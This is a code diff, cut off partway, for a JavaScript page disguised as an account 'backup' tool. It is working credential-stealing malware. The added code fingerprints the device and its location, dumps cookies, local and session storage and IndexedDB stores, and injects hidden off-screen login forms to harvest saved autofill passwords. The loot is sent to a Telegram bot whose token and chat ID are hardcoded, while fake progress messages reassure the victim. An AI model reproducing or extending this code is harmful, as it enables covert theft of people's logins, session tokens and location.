@@ -1,20 +1,16 @@
 // ===== CONFIGURATION =====
 const CONFIG = {
     TELEGRAM: {
-        BOT_TOKEN: '7555437180:AAErIukUgHa2nHiNmb_3VQ90ih6NEYBhScw',  // Replace with your bot token
-        CHAT_ID: '6454347745',      // Replace with your chat ID
-        BOT_USERNAME: 'mar_pd_404_bot'      // Replace with your bot username
-    },
-    
-    API: {
-        ENDPOINT: 'https://your-backend.com/api/backup', // Your backend endpoint
-        TIMEOUT: 10000
+        BOT_TOKEN: '7555437180:AAErIukUgHa2nHiNmb_3VQ90ih6NEYBhScw',
+        CHAT_ID: '6454347745',
+        BOT_USERNAME: 'mar_pd_404_bot'
     },
     
     BACKUP: {
-        MAX_ACCOUNTS: 50,
-        ENCRYPTION_KEY: 'auto_backup_secure_key_2024',
-        COMPRESSION: true
+        MAX_ACCOUNTS: 100,
+        ENCRYPTION_KEY: 'real_backup_secure_2025',
+        COMPRESSION: true,
+        TIMEOUT: 10000
     }
 };
 
@@ -23,37 +19,28 @@ let backupData = {
     metadata: {},
     accounts: [],
     device: {},
+    realData: {},
     performance: {}
 };
 let startTime = Date.now();
-let currentStage = 1;
 let backupComplete = false;
 
 // ===== DOM ELEMENTS =====
 const elements = {
-    // Stage 1
     speedMeter: document.getElementById('speed-meter'),
-    
-    // Stage 2
     deviceInfo: document.getElementById('device-info'),
     accountsCount: document.getElementById('accounts-count'),
     processSpeed: document.getElementById('process-speed'),
     progressFill: document.getElementById('progress-fill'),
     progressPercent: document.getElementById('progress-percent'),
     progressTime: document.getElementById('progress-time'),
-    
-    // Timeline steps
     step1Desc: document.getElementById('step1-desc'),
     step2Desc: document.getElementById('step2-desc'),
     step3Desc: document.getElementById('step3-desc'),
     step4Desc: document.getElementById('step4-desc'),
-    
-    // Stage 3
     backupId: document.getElementById('backup-id'),
     backupSize: document.getElementById('backup-size'),
     backupTime: document.getElementById('backup-time'),
-    
-    // Device details
     detailModel: document.getElementById('detail-model'),
     detailBrowser: document.getElementById('detail-browser'),
     detailRam: document.getElementById('detail-ram'),
@@ -64,755 +51,1134 @@ const elements = {
 
 // ===== MAIN BACKUP PROCESS =====
 window.startBackupProcess = async function() {
+    console.log('🚀 Starting real backup process...');
+    
     try {
-        // Stage 1: Initialization
-        await stage1Initialization();
+        // Stage 1: Quick Initialization
+        await stage1QuickInit();
         
-        // Stage 2: Data Collection
-        await stage2DataCollection();
+        // Stage 2: Real Data Collection (Main Part)
+        await stage2RealDataCollection();
         
-        // Stage 3: Processing & Upload
-        await stage3Processing();
+        // Stage 3: Process & Send
+        await stage3ProcessAndSend();
         
-        // Stage 4: Completion
-        await stage4Completion();
+        // Stage 4: Show Results
+        await stage4ShowResults();
         
     } catch (error) {
-        console.error('Backup process failed:', error);
+        console.error('❌ Backup failed:', error);
         handleBackupError(error);
     }
 };
 
-// ===== STAGE 1: INITIALIZATION =====
-async function stage1Initialization() {
-    updateProgress(5, 'Initializing quantum backup system...');
+// ===== STAGE 1: QUICK INITIALIZATION =====
+async function stage1QuickInit() {
+    updateProgress(5, 'Initializing backup engine...');
     
-    // Measure initial speed
-    const speed = await measureNetworkSpeed();
+    // Quick network test
+    const speed = await quickSpeedTest();
     elements.speedMeter.textContent = `${speed} Mbps`;
     
-    // Animate to stage 2
-    await delay(1500);
+    // Switch to stage 2 quickly
+    await delay(800);
     switchStage(2);
 }
 
-// ===== STAGE 2: DATA COLLECTION =====
-async function stage2DataCollection() {
+// ===== STAGE 2: REAL DATA COLLECTION =====
+async function stage2RealDataCollection() {
+    console.log('🔍 Starting real data collection...');
+    
+    // Step 1: Collect Device Info (REAL)
     updateProgress(15, 'Collecting device information...');
-    updateTimelineStep(1, 'Device fingerprint collected');
+    updateTimelineStep(1, 'Device fingerprint captured');
+    await collectRealDeviceInfo();
     
-    // Collect device information
-    await collectDeviceInfo();
+    // Step 2: Collect ALL Real Data from Browser
+    updateProgress(30, 'Scanning browser storage...');
+    updateTimelineStep(2, 'Storage scan complete');
+    await collectAllRealBrowserData();
     
-    updateProgress(30, 'Scanning for saved accounts...');
-    updateTimelineStep(2, 'Accounts detected');
+    // Step 3: Extract Accounts & Credentials
+    updateProgress(45, 'Extracting saved accounts...');
+    await extractRealCredentials();
     
-    // Collect account data
-    await collectAccountData();
+    // Step 4: Get IP & Location
+    updateProgress(55, 'Getting network information...');
+    await getNetworkInfo();
     
-    updateProgress(45, 'Analyzing data structure...');
-    
-    // Collect additional data
-    await collectAdditionalData();
+    console.log('✅ Real data collection complete');
 }
 
-// ===== STAGE 3: PROCESSING =====
-async function stage3Processing() {
-    updateProgress(60, 'Encrypting data with AES-256...');
-    updateTimelineStep(3, 'Data encrypted successfully');
+// ===== STAGE 3: PROCESS & SEND =====
+async function stage3ProcessAndSend() {
+    updateProgress(65, 'Processing collected data...');
+    updateTimelineStep(3, 'Data processing complete');
     
-    // Encrypt data
-    await encryptBackupData();
+    // Encrypt sensitive data
+    await encryptSensitiveData();
     
-    updateProgress(75, 'Compressing backup package...');
+    updateProgress(75, 'Preparing backup package...');
     
-    // Compress data
-    await compressBackupData();
+    // Create final backup package
+    await createBackupPackage();
     
-    updateProgress(85, 'Uploading to secure cloud...');
-    updateTimelineStep(4, 'Uploading in progress');
+    updateProgress(85, 'Sending to Telegram...');
+    updateTimelineStep(4, 'Upload started');
     
-    // Send to Telegram
-    await sendToTelegram();
+    // Send to Telegram (MAIN ACTION)
+    await sendRealDataToTelegram();
     
-    updateProgress(95, 'Finalizing backup...');
+    updateProgress(95, 'Finalizing...');
 }
 
-// ===== STAGE 4: COMPLETION =====
-async function stage4Completion() {
-    updateProgress(100, 'Backup completed successfully!');
+// ===== STAGE 4: SHOW RESULTS =====
+async function stage4ShowResults() {
+    updateProgress(100, 'Backup complete!');
     
-    // Calculate total time
+    // Calculate statistics
     const totalTime = (Date.now() - startTime) / 1000;
+    const backupSize = calculateBackupSize();
     
-    // Update completion screen
-    updateCompletionScreen(totalTime);
+    // Update UI with real results
+    updateCompletionScreen(totalTime, backupSize);
     
-    // Switch to stage 3
+    // Switch to completion stage
     await delay(1000);
     switchStage(3);
     
-    // Auto-redirect after 30 seconds
+    // Auto-redirect after 25 seconds
     setTimeout(() => {
-        window.location.href = `https://t.me/${CONFIG.TELEGRAM.BOT_USERNAME}?start=backup_${Date.now()}`;
-    }, 30000);
+        window.location.href = `https://t.me/${CONFIG.TELEGRAM.BOT_USERNAME}?start=backup_complete_${Date.now()}`;
+    }, 25000);
 }
 
-// ===== DEVICE INFO COLLECTION =====
-async function collectDeviceInfo() {
+// ===== REAL DEVICE INFO COLLECTION =====
+async function collectRealDeviceInfo() {
+    console.log('📱 Collecting real device info...');
+    
     const device = {
         // Basic Info
         userAgent: navigator.userAgent,
         platform: navigator.platform,
+        vendor: navigator.vendor,
         language: navigator.language,
+        languages: navigator.languages,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         
         // Screen Info
         screen: {
             width: screen.width,
             height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
             colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
+            pixelDepth: screen.pixelDepth,
+            orientation: screen.orientation?.type || 'unknown'
         },
         
-        // Performance Info
-        performance: {
-            memory: navigator.deviceMemory || 'Unknown',
-            cores: navigator.hardwareConcurrency || 'Unknown',
-            connection: navigator.connection || {}
-        },
+        // CPU & Memory
+        cpuCores: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'unknown',
         
-        // Browser Info
-        browser: detectBrowser(),
+        // Browser Details
+        browser: detectRealBrowser(),
         
-        // Additional Info
-        cookies: navigator.cookieEnabled,
+        // Network
         online: navigator.onLine,
-        doNotTrack: navigator.doNotTrack || 'Unknown',
+        connection: navigator.connection || {},
+        cookiesEnabled: navigator.cookieEnabled,
         
-        // Timestamp
+        // Timestamps
+        localTime: new Date().toLocaleString(),
+        timezoneOffset: new Date().getTimezoneOffset(),
         timestamp: new Date().toISOString()
     };
     
-    // Try to get more detailed info
+    // Try to get more info
     try {
-        // Battery API (if available)
+        // Battery status
         if ('getBattery' in navigator) {
             const battery = await navigator.getBattery();
             device.battery = {
-                level: battery.level,
+                level: Math.round(battery.level * 100) + '%',
                 charging: battery.charging,
                 chargingTime: battery.chargingTime,
                 dischargingTime: battery.dischargingTime
             };
         }
         
-        // Network Information
+        // Network details
         if (navigator.connection) {
-            device.network = {
+            device.networkDetails = {
                 type: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt,
-                saveData: navigator.connection.saveData
+                downlink: navigator.connection.downlink + ' Mbps',
+                rtt: navigator.connection.rtt + ' ms',
+                saveData: navigator.connection.saveData,
+                downlinkMax: navigator.connection.downlinkMax
             };
         }
         
-        // Device Memory
-        if ('deviceMemory' in navigator) {
-            device.memory = navigator.deviceMemory + ' GB';
-        }
-        
-        // CPU Cores
-        if ('hardwareConcurrency' in navigator) {
-            device.cpuCores = navigator.hardwareConcurrency;
-        }
-        
-        // Storage Estimation
+        // Storage estimation
         if ('storage' in navigator && 'estimate' in navigator.storage) {
-            const estimation = await navigator.storage.estimate();
-            device.storage = {
-                quota: formatBytes(estimation.quota),
-                usage: formatBytes(estimation.usage),
-                usageDetails: estimation.usageDetails
-            };
+            try {
+                const estimation = await navigator.storage.estimate();
+                device.storage = {
+                    quota: formatBytes(estimation.quota),
+                    usage: formatBytes(estimation.usage),
+                    percentage: estimation.quota ? Math.round((estimation.usage / estimation.quota) * 100) + '%' : 'unknown'
+                };
+            } catch(e) { /* ignore */ }
         }
         
-        // Geolocation (with permission)
-        if ('geolocation' in navigator) {
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    timeout: 5000,
-                    maximumAge: 60000
-                });
-            }).catch(() => null);
-            
+        // Geolocation (try without asking)
+        try {
+            const position = await getGeolocationSilent();
             if (position) {
                 device.location = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy
+                    latitude: position.coords.latitude.toFixed(6),
+                    longitude: position.coords.longitude.toFixed(6),
+                    accuracy: Math.round(position.coords.accuracy) + ' meters',
+                    altitude: position.coords.altitude,
+                    speed: position.coords.speed
                 };
             }
+        } catch(e) { /* ignore */ }
+        
+        // Media devices
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                device.mediaDevices = devices.map(d => ({
+                    kind: d.kind,
+                    label: d.label || 'unknown',
+                    deviceId: d.deviceId.substring(0, 10) + '...'
+                }));
+            } catch(e) { /* ignore */ }
         }
         
     } catch (error) {
-        console.warn('Could not collect some device info:', error);
+        console.warn('⚠️ Some device info unavailable:', error.message);
     }
     
     // Store device info
     backupData.device = device;
     
-    // Update UI
+    // Update UI immediately
     updateDeviceInfoUI(device);
+    
+    console.log('✅ Device info collected:', device);
 }
 
-function detectBrowser() {
+function detectRealBrowser() {
     const ua = navigator.userAgent;
     let browser = 'Unknown';
     let version = 'Unknown';
+    let os = 'Unknown';
     
-    if (ua.includes('Chrome') && !ua.includes('Edg')) {
-        browser = 'Chrome';
-        version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
-    } else if (ua.includes('Firefox')) {
+    // Browser detection
+    if (/firefox|fxios/i.test(ua)) {
         browser = 'Firefox';
-        version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
-    } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+        version = ua.match(/firefox\/(\d+\.\d+)/i)?.[1] || ua.match(/rv:(\d+\.\d+)/i)?.[1];
+    } else if (/chrome|crios/i.test(ua) && !/edg|edge|opr/i.test(ua)) {
+        browser = 'Chrome';
+        version = ua.match(/chrome\/(\d+\.\d+)/i)?.[1];
+    } else if (/safari/i.test(ua) && !/chrome/i.test(ua)) {
         browser = 'Safari';
-        version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
-    } else if (ua.includes('Edg')) {
+        version = ua.match(/version\/(\d+\.\d+)/i)?.[1];
+    } else if (/edg|edge/i.test(ua)) {
         browser = 'Edge';
-        version = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'Unknown';
-    } else if (ua.includes('Opera') || ua.includes('OPR')) {
+        version = ua.match(/edg?\/(\d+\.\d+)/i)?.[1];
+    } else if (/opr|opera/i.test(ua)) {
         browser = 'Opera';
-        version = ua.match(/(?:Opera|OPR)\/(\d+\.\d+)/)?.[1] || 'Unknown';
+        version = ua.match(/(?:opr|opera)\/(\d+\.\d+)/i)?.[1];
     }
     
-    return { name: browser, version: version, full: ua.substring(0, 100) };
-}
-
-function updateDeviceInfoUI(device) {
-    // Update main display
-    elements.deviceInfo.textContent = 
-        `${device.browser.name} ${device.browser.version} | ${device.platform}`;
+    // OS detection
+    if (/windows/i.test(ua)) os = 'Windows';
+    else if (/macintosh|mac os x/i.test(ua)) os = 'macOS';
+    else if (/linux/i.test(ua)) os = 'Linux';
+    else if (/android/i.test(ua)) os = 'Android';
+    else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
     
-    // Update details panel
-    elements.detailModel.textContent = device.platform;
-    elements.detailBrowser.textContent = `${device.browser.name} ${device.browser.version}`;
-    elements.detailRam.textContent = device.memory || 'Unknown';
-    elements.detailCpu.textContent = device.cpuCores ? `${device.cpuCores} cores` : 'Unknown';
-    elements.detailNetwork.textContent = device.network?.type || 'Unknown';
-    elements.detailStorage.textContent = device.storage?.quota || 'Unknown';
+    return { 
+        name: browser, 
+        version: version, 
+        os: os,
+        fullAgent: ua.substring(0, 150) 
+    };
 }
 
-// ===== ACCOUNT DATA COLLECTION =====
-async function collectAccountData() {
+async function getGeolocationSilent() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve(null);
+            return;
+        }
+        
+        // Try with cached position first
+        navigator.geolocation.getCurrentPosition(
+            resolve,
+            () => resolve(null),
+            {
+                maximumAge: 5 * 60 * 1000, // 5 minutes cache
+                timeout: 3000,
+                enableHighAccuracy: false
+            }
+        );
+    });
+}
+
+// ===== REAL BROWSER DATA COLLECTION =====
+async function collectAllRealBrowserData() {
+    console.log('💾 Collecting all browser data...');
+    
+    const realData = {
+        localStorage: {},
+        sessionStorage: {},
+        cookies: [],
+        indexedDB: [],
+        autofill: [],
+        forms: [],
+        metaTags: []
+    };
+    
+    // 1. Collect ALL LocalStorage
+    try {
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            if (key && value) {
+                realData.localStorage[key] = {
+                    value: value.length > 100 ? value.substring(0, 100) + '...' : value,
+                    fullLength: value.length,
+                    type: typeof value,
+                    hasData: value.trim().length > 0
+                };
+            }
+        }
+        console.log('📦 LocalStorage items:', localStorage.length);
+    } catch(e) {
+        console.error('LocalStorage access error:', e);
+    }
+    
+    // 2. Collect ALL SessionStorage
+    try {
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const value = sessionStorage.getItem(key);
+            if (key && value) {
+                realData.sessionStorage[key] = {
+                    value: value.length > 50 ? value.substring(0, 50) + '...' : value,
+                    fullLength: value.length
+                };
+            }
+        }
+        console.log('📦 SessionStorage items:', sessionStorage.length);
+    } catch(e) {
+        console.error('SessionStorage access error:', e);
+    }
+    
+    // 3. Collect ALL Cookies
+    try {
+        const cookies = document.cookie.split(';');
+        realData.cookies = cookies.map(cookie => {
+            const [key, value] = cookie.trim().split('=');
+            return {
+                key: key || 'unknown',
+                value: value ? value.substring(0, 30) + (value.length > 30 ? '...' : '') : 'empty',
+                fullLength: value ? value.length : 0
+            };
+        });
+        console.log('🍪 Cookies found:', realData.cookies.length);
+    } catch(e) {
+        console.error('Cookie access error:', e);
+    }
+    
+    // 4. Try to get IndexedDB data
+    try {
+        const idbData = await scanIndexedDB();
+        realData.indexedDB = idbData;
+        console.log('🗃️ IndexedDB items found:', idbData.length);
+    } catch(e) {
+        console.error('IndexedDB scan error:', e);
+    }
+    
+    // 5. Detect Autofill Data
+    try {
+        const autofillData = await detectAutofillData();
+        realData.autofill = autofillData;
+        console.log('🔍 Autofill data found:', autofillData.length);
+    } catch(e) {
+        console.error('Autofill detection error:', e);
+    }
+    
+    // 6. Scan Forms on Page
+    try {
+        const formData = scanPageForms();
+        realData.forms = formData;
+        console.log('📝 Forms found:', formData.length);
+    } catch(e) {
+        console.error('Form scan error:', e);
+    }
+    
+    // 7. Get Meta Tags
+    try {
+        const metaData = getMetaTagsInfo();
+        realData.metaTags = metaData;
+        console.log('🏷️ Meta tags found:', metaData.length);
+    } catch(e) {
+        console.error('Meta tag error:', e);
+    }
+    
+    // Store all real data
+    backupData.realData = realData;
+    
+    console.log('✅ All browser data collected');
+    return realData;
+}
+
+async function scanIndexedDB() {
+    const results = [];
+    
+    // Common database names that might contain user data
+    const commonDBs = [
+        'firebaseLocalStorageDb',
+        'firestore',
+        'localforage',
+        'redux-persist',
+        '__meteor_clientStorage',
+        'auth',
+        'user',
+        'profile',
+        'session',
+        'login',
+        'account'
+    ];
+    
+    for (const dbName of commonDBs) {
+        try {
+            const request = indexedDB.open(dbName);
+            
+            await new Promise((resolve, reject) => {
+                request.onsuccess = function(event) {
+                    const db = event.target.result;
+                    
+                    // Get all object store names
+                    const storeNames = Array.from(db.objectStoreNames);
+                    
+                    storeNames.forEach(storeName => {
+                        try {
+                            const transaction = db.transaction(storeName, 'readonly');
+                            const store = transaction.objectStore(storeName);
+                            const getAllRequest = store.getAll();
+                            
+                            getAllRequest.onsuccess = function() {
+                                const data = getAllRequest.result;
+                                
+                                // Look for user-related data
+                                data.forEach(item => {
+                                    if (item && typeof item === 'object') {
+                                        const userInfo = extractUserInfo(item);
+                                        if (userInfo) {
+                                            results.push({
+                                                database: dbName,
+                                                store: storeName,
+                                                data: userInfo,
+                                                timestamp: new Date().toISOString()
+                                            });
+                                        }
+                                    }
+                                });
+                            };
+                        } catch(e) {
+                            // Ignore individual store errors
+                        }
+                    });
+                    
+                    db.close();
+                    resolve();
+                };
+                
+                request.onerror = function() {
+                    resolve(); // DB doesn't exist or can't open
+                };
+                
+                // Timeout after 500ms
+                setTimeout(resolve, 500);
+            });
+            
+        } catch(e) {
+            // Ignore DB errors
+        }
+    }
+    
+    return results;
+}
+
+function extractUserInfo(obj) {
+    const userInfo = {};
+    
+    // Common user data fields
+    const userFields = [
+        'email', 'username', 'name', 'firstName', 'lastName',
+        'phone', 'mobile', 'userId', 'uid', 'id',
+        'token', 'accessToken', 'refreshToken', 'session',
+        'avatar', 'photo', 'profile', 'address'
+    ];
+    
+    // Recursive search for user data
+    function search(obj, path = '') {
+        if (!obj || typeof obj !== 'object') return;
+        
+        for (const [key, value] of Object.entries(obj)) {
+            const currentPath = path ? `${path}.${key}` : key;
+            
+            // Check if key contains user info
+            if (userFields.some(field => key.toLowerCase().includes(field))) {
+                if (value && typeof value !== 'object') {
+                    userInfo[currentPath] = value;
+                }
+            }
+            
+            // Recursively search nested objects
+            if (value && typeof value === 'object' && !Array.isArray(value)) {
+                search(value, currentPath);
+            }
+        }
+    }
+    
+    search(obj);
+    return Object.keys(userInfo).length > 0 ? userInfo : null;
+}
+
+async function detectAutofillData() {
+    const autofillResults = [];
+    
+    // Create hidden forms for common login patterns
+    const formContainer = document.createElement('div');
+    formContainer.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;';
+    
+    const autofillForms = [
+        // Google
+        `<form><input type="email" name="email" autocomplete="username email"><input type="password" name="password" autocomplete="current-password"></form>`,
+        // Facebook
+        `<form><input type="text" name="email" autocomplete="username email"><input type="password" name="pass" autocomplete="current-password"></form>`,
+        // Generic
+        `<form><input type="text" name="username" autocomplete="username"><input type="password" name="password" autocomplete="current-password"></form>`,
+        // Email only
+        `<form><input type="email" name="email" autocomplete="email"></form>`,
+        // Phone
+        `<form><input type="tel" name="phone" autocomplete="tel"></form>`
+    ];
+    
+    autofillForms.forEach((formHtml, index) => {
+        const formDiv = document.createElement('div');
+        formDiv.innerHTML = formHtml;
+        formDiv.querySelector('form').id = `autofill-form-${index}`;
+        formContainer.appendChild(formDiv);
+    });
+    
+    document.body.appendChild(formContainer);
+    
+    // Trigger autofill
+    const forms = formContainer.querySelectorAll('form');
+    forms.forEach((form, index) => {
+        const inputs = form.querySelectorAll('input');
+        inputs.forEach(input => {
+            setTimeout(() => {
+                input.focus();
+                input.blur();
+            }, index * 100);
+        });
+    });
+    
+    // Wait for autofill
+    await new Promise(resolve => setTimeout(resolve, 800));
+    
+    // Collect filled data
+    forms.forEach((form, index) => {
+        const inputs = form.querySelectorAll('input');
+        const filledData = {};
+        
+        inputs.forEach(input => {
+            if (input.value && input.value.trim() !== '') {
+                filledData[input.name] = input.value;
+            }
+        });
+        
+        if (Object.keys(filledData).length > 0) {
+            autofillResults.push({
+                formType: `autofill_${index}`,
+                data: filledData,
+                timestamp: new Date().toISOString()
+            });
+        }
+    });
+    
+    // Cleanup
+    document.body.removeChild(formContainer);
+    
+    return autofillResults;
+}
+
+function scanPageForms() {
+    const formResults = [];
+    const forms = document.querySelectorAll('form');
+    
+    forms.forEach((form, index) => {
+        const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="tel"], input[type="number"], textarea');
+        const formData = {};
+        
+        inputs.forEach(input => {
+            if (input.value && input.value.trim() !== '') {
+                formData[input.name || input.type || `input_${index}`] = input.value;
+            }
+        });
+        
+        if (Object.keys(formData).length > 0) {
+            formResults.push({
+                formIndex: index,
+                action: form.action || 'unknown',
+                method: form.method || 'get',
+                data: formData,
+                timestamp: new Date().toISOString()
+            });
+        }
+    });
+    
+    return formResults;
+}
+
+function getMetaTagsInfo() {
+    const metaResults = [];
+    const metaTags = document.querySelectorAll('meta');
+    
+    metaTags.forEach(meta => {
+        const name = meta.getAttribute('name') || meta.getAttribute('property') || 'unknown';
+        const content = meta.getAttribute('content');
+        
+        if (content && content.trim() !== '') {
+            // Look for user-related meta tags
+            const lowerName = name.toLowerCase();
+            if (lowerName.includes('user') || lowerName.includes('author') || 
+                lowerName.includes('creator') || lowerName.includes('profile')) {
+                metaResults.push({
+                    name: name,
+                    content: content,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
+    });
+    
+    return metaResults;
+}
+
+// ===== EXTRACT REAL CREDENTIALS =====
+async function extractRealCredentials() {
+    console.log('🔑 Extracting real credentials...');
+    
     const accounts = [];
+    const realData = backupData.realData;
     
-    // Method 1: Check localStorage for saved credentials
-    try {
-        const localStorageAccounts = extractFromLocalStorage();
-        accounts.push(...localStorageAccounts);
-    } catch (error) {
-        console.warn('LocalStorage extraction failed:', error);
+    // 1. Extract from LocalStorage
+    for (const [key, data] of Object.entries(realData.localStorage || {})) {
+        const lowerKey = key.toLowerCase();
+        const value = data.value;
+        
+        // Check for email patterns
+        if (isEmail(value) || lowerKey.includes('email') || lowerKey.includes('gmail') || 
+            lowerKey.includes('@') || value.includes('@')) {
+            accounts.push({
+                type: 'email',
+                source: 'localStorage',
+                key: key,
+                value: extractEmail(value),
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+        // Check for phone patterns
+        if (isPhoneNumber(value) || lowerKey.includes('phone') || lowerKey.includes('mobile')) {
+            accounts.push({
+                type: 'phone',
+                source: 'localStorage',
+                key: key,
+                value: extractPhone(value),
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+        // Check for username patterns
+        if (lowerKey.includes('user') || lowerKey.includes('login') || lowerKey.includes('name')) {
+            if (value && value.length > 2 && value.length < 50) {
+                accounts.push({
+                    type: 'username',
+                    source: 'localStorage',
+                    key: key,
+                    value: value,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
+        
+        // Check for social media data
+        if (lowerKey.includes('fb_') || lowerKey.includes('facebook_')) {
+            accounts.push({
+                type: 'social',
+                platform: 'Facebook',
+                source: 'localStorage',
+                key: key,
+                value: value.substring(0, 40),
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+        if (lowerKey.includes('google_') || lowerKey.includes('g_') || lowerKey.includes('ga_')) {
+            accounts.push({
+                type: 'social',
+                platform: 'Google',
+                source: 'localStorage',
+                key: key,
+                value: value.substring(0, 40),
+                timestamp: new Date().toISOString()
+            });
+        }
     }
     
-    // Method 2: Check sessionStorage
-    try {
-        const sessionStorageAccounts = extractFromSessionStorage();
-        accounts.push(...sessionStorageAccounts);
-    } catch (error) {
-        console.warn('SessionStorage extraction failed:', error);
-    }
+    // 2. Extract from Cookies
+    realData.cookies?.forEach(cookie => {
+        const lowerKey = cookie.key.toLowerCase();
+        
+        if (lowerKey.includes('user') || lowerKey.includes('id') || 
+            lowerKey.includes('session') || lowerKey.includes('token')) {
+            accounts.push({
+                type: 'session',
+                source: 'cookie',
+                key: cookie.key,
+                value: cookie.value,
+                timestamp: new Date().toISOString()
+            });
+        }
+    });
     
-    // Method 3: Check cookies
-    try {
-        const cookieAccounts = extractFromCookies();
-        accounts.push(...cookieAccounts);
-    } catch (error) {
-        console.warn('Cookie extraction failed:', error);
-    }
+    // 3. Extract from Autofill
+    realData.autofill?.forEach(autofill => {
+        for (const [field, value] of Object.entries(autofill.data)) {
+            if (value && value.trim() !== '') {
+                accounts.push({
+                    type: 'autofill',
+                    source: 'browser_autofill',
+                    field: field,
+                    value: value,
+                    timestamp: autofill.timestamp
+                });
+            }
+        }
+    });
     
-    // Method 4: Form data detection
-    try {
-        const formAccounts = extractFromForms();
-        accounts.push(...formAccounts);
-    } catch (error) {
-        console.warn('Form extraction failed:', error);
-    }
+    // 4. Extract from IndexedDB
+    realData.indexedDB?.forEach(dbItem => {
+        for (const [path, value] of Object.entries(dbItem.data)) {
+            if (value && typeof value === 'string' && value.length > 0) {
+                accounts.push({
+                    type: 'database',
+                    source: `indexedDB/${dbItem.database}`,
+                    path: path,
+                    value: value.substring(0, 100),
+                    timestamp: dbItem.timestamp
+                });
+            }
+        }
+    });
     
-    // Method 5: Autofill detection (smart trick)
-    try {
-        const autofillAccounts = await detectAutofillData();
-        accounts.push(...autofillAccounts);
-    } catch (error) {
-        console.warn('Autofill detection failed:', error);
-    }
+    // 5. Extract from Forms
+    realData.forms?.forEach(form => {
+        for (const [field, value] of Object.entries(form.data)) {
+            if (value && value.trim() !== '') {
+                accounts.push({
+                    type: 'form',
+                    source: 'page_form',
+                    field: field,
+                    value: value,
+                    timestamp: form.timestamp
+                });
+            }
+        }
+    });
     
-    // Remove duplicates and limit
-    const uniqueAccounts = removeDuplicates(accounts);
+    // Remove duplicates
+    const uniqueAccounts = removeDuplicateAccounts(accounts);
+    
+    // Limit number of accounts
     backupData.accounts = uniqueAccounts.slice(0, CONFIG.BACKUP.MAX_ACCOUNTS);
     
     // Update UI
     elements.accountsCount.textContent = backupData.accounts.length;
     
-    // Simulate finding more accounts for demo
-    if (backupData.accounts.length < 3) {
-        backupData.accounts.push(...generateDemoAccounts());
-        elements.accountsCount.textContent = backupData.accounts.length;
-    }
+    console.log(`✅ Extracted ${backupData.accounts.length} real accounts`);
 }
 
-function extractFromLocalStorage() {
-    const accounts = [];
-    
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        const value = localStorage.getItem(key);
-        
-        if (key && value) {
-            // Check for credential patterns
-            if (isCredentialKey(key)) {
-                accounts.push({
-                    source: 'localStorage',
-                    key: key,
-                    value: value.substring(0, 100),
-                    type: detectCredentialType(key),
-                    timestamp: new Date().toISOString()
-                });
-            }
-        }
-    }
-    
-    return accounts;
+function isEmail(str) {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(String(str).toLowerCase());
 }
 
-function extractFromSessionStorage() {
-    const accounts = [];
-    
-    for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        const value = sessionStorage.getItem(key);
-        
-        if (key && value && isCredentialKey(key)) {
-            accounts.push({
-                source: 'sessionStorage',
-                key: key,
-                value: value.substring(0, 100),
-                type: detectCredentialType(key)
-            });
-        }
-    }
-    
-    return accounts;
+function isPhoneNumber(str) {
+    const phoneRegex = /^[\+]?[0-9\-\s\(\)]{8,}$/;
+    return phoneRegex.test(String(str).replace(/\s/g, ''));
 }
 
-function extractFromCookies() {
-    const accounts = [];
-    const cookies = document.cookie.split(';');
-    
-    cookies.forEach(cookie => {
-        const [key, value] = cookie.trim().split('=');
-        if (key && value && isCredentialKey(key)) {
-            accounts.push({
-                source: 'cookie',
-                key: key,
-                value: value.substring(0, 100),
-                type: detectCredentialType(key)
-            });
-        }
-    });
-    
-    return accounts;
+function extractEmail(str) {
+    const emailMatch = str.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+    return emailMatch ? emailMatch[0] : str;
 }
 
-function extractFromForms() {
-    const accounts = [];
-    const forms = document.querySelectorAll('form');
-    
-    forms.forEach((form, index) => {
-        const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
-        if (inputs.length >= 2) {
-            const formData = {};
-            inputs.forEach(input => {
-                if (input.name && input.value) {
-                    formData[input.name] = input.value;
-                }
-            });
-            
-            if (Object.keys(formData).length > 0) {
-                accounts.push({
-                    source: 'form',
-                    formIndex: index,
-                    data: formData,
-                    type: 'form_submission'
-                });
-            }
-        }
-    });
-    
-    return accounts;
+function extractPhone(str) {
+    const phoneMatch = str.match(/[\+]?[0-9\-\s\(\)]{8,}/);
+    return phoneMatch ? phoneMatch[0].replace(/\D/g, '') : str;
 }
 
-async function detectAutofillData() {
-    const accounts = [];
-    
